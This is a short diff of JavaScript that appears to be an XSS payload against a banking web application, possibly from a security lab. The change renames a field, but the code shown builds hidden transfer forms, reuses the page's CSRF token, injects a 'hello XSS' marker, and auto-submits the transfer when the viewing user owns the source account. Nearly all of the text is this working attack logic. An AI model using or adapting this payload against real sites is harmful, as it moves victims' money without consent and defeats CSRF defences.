@@ -28,7 +28,7 @@ function addTransferForm(formname, fromAccount, toAccount, amount, currency, act
         createHiddenInput(form, "toAccountNo", toAccount);
         createHiddenInput(form, "amount", amount);
         createHiddenInput(form, "currency", currency);
-        createHiddenInput(form, "note", '<span id="note_' + formname + '"></span>hello XSS');
+        createHiddenInput(form, "comment", '<span id="comment_' + formname + '"></span>hello XSS');
         var csrfToken = document.querySelector("meta[name='_csrf']").getAttribute("content");
         if (csrfToken) {
             createHiddenInput(form, "_csrf", csrfToken);
@@ -61,7 +61,7 @@ function createHiddenInput(form, name, value) {
 
 function submitTransferForm(formname, fromAccount) {
     var isAccOwner = document.getElementById("title").textContent.indexOf(fromAccount) >= 0;
-    var alreadyDone = document.getElementById("note_" + formname);
+    var alreadyDone = document.getElementById("comment_" + formname);
     if (isAccOwner && !alreadyDone) {
         console.log("Submitting : " + formname);
         document.getElementById(formname).submit();
